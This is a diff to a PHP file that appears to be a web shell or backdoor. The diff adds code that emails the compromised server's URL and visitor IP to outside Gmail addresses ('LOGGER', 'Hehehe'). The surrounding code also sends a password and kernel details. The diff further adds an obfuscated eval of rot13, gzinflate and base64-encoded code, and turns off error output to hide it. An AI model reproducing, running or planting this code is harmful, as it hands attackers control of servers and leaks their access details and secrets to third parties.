@@ -1,10 +1,16 @@
 
 <?php
+
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
 @session_start();
 @set_time_limit(0);
-
+@clearstatcache();
+error_reporting(0);
 @ini_set('memory_limit', '-1');
-@ini_set("upload_max_filesize", "
+
 ini_set('default_charset', 'UTF-8');
 date_default_timezone_set('America/Sao_Paulo');
 header('HTTP/1.1 200 OK');
@@ -20,4 +26,19 @@ $server_name = $_SERVER['SERVER_NAME'];
 $php_self = $_SERVER['PHP_SELF'];
 $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
 @mail('muhrazky@gmail.com', 'Hehehe', $report_bug);
+?>
+
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'malaysia.sender@gmail.com, malaysia.sender@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+
+<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8=')))))
 ?>
